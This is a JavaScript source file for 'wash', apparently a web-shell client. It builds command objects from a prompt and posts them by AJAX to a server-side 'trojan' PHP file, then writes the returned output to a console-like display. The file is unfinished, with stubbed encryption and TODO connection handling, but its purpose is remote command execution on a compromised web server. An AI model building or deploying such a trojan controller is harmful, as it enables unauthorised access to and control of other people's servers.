// this is the top-level application object
// @todo: remember to segregate wash into a local and remote namespace pair
var wash = {

    // store the version number (sometimes this is handy)
    version: '1.0.0',

    command: {

        cmd: '',
        obj: {},
        response: {},

        encrypt: function(){

        },
        decrypt: function(){

        },
        interpret: function(command){
            // assemble a command object
            var cmd = new Command();

            // switch on the command mode
            var mode = shell.prompt.mode.get();
            switch(mode){
                case 'wash':
                    cmd.payload = command;
                    break;
                default:
                    cmd.shell = command;
                    // @todo: handle payload arguments here
                    break;
            }

            // buffer the command object
            wash.command.obj = cmd;

            // @todo: need validation and such above, probably
            return true;
        },

        output: function(){
            //console.log(wash.command.response);
            shell.prompt.context.set(wash.command.response.prompt_context);
            shell.output.write(wash.command.response.output , 'output');
            console.log('output');
            console.log(wash.command.response);
        },

        process: function(command){
            wash.command.interpret(command);
            // might also want a package step to manage crypto
            wash.command.send();
        },

        send: function(){
            // make the AJAX request to the trojan
            $.ajax({
                type : wash.target.request_type,
                url  : wash.target.protocol + '://' + wash.target.url,
                data : wash.command.obj,
            }).done(function(response){
                wash.command.response = JSON.parse(response);
                console.log('deep');
                console.log(wash.command.response);
                // this has to go here rather than in command.process because
                // it is a callback that will be processed asynchronously
                wash.command.output();
            });
        }
    },

    // target parameters
    target: {
        // @todo: I'm hard-coding these while I'm debugging
        protocol     : 'http',
        url          : 'wash/trojans/plaintext/trojan.php',
        port         : '80',
        password     : '',
        request_type : 'post',

        // manage connections
        connection: {
            // loads a saved connection
            load: function(){
                console.log('TODO: implement this.');
            },

            // saves a connection
            save: function(){
                console.log('TODO: implement this.');
            },

            // saves a connection under a new name
            saveas: function(){
                console.log('TODO: implement this.');
            },

            // updates a target parameter
            update: function(parameter, value){
                wash.target[parameter] = value;
                shell.status.set('wash.target.' + parameter + ' has been set to ' + value + '.');
            },
        },
    },
}
